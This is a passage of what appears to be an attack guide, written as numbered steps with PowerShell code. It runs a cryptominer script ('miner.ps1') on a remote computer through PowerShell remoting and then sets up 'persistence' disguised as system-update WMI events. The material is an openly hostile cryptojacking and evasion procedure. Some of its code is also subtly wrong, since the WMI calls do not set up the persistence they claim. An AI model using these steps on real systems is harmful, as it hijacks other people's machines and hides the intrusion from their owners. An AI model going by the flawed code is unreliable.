$remotingConfig = @{
    ComputerName = "remote-computer"
    Credential = (Get-Credential)
    ScriptBlock = {
       .\miner.ps1
    }
}

# Execute the remoting configuration
Invoke-Command @remotingConfig
```
**Step 2: Establish persistence through WMI event subscriptions mimicking system updates**

Create a new PowerShell script (`persistence.ps1`) that establishes persistence through WMI event subscriptions:
```powershell
# Persistence script
$eventName = "SystemUpdateCompleted"
$eventQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance isa 'Win32_Service'"

# Subscribe to the WMI event
Register-WmiEvent -EventName $eventName -Query $eventQuery -SourceIdentifier "SystemUpdateCompleted"

# Simulate system updates
while ($true) {
    Start-Sleep -s 60
    Invoke-WmiMethod -Class Win32_Service -Name StartService -ArgumentList ("MyService", "Start")
}
```
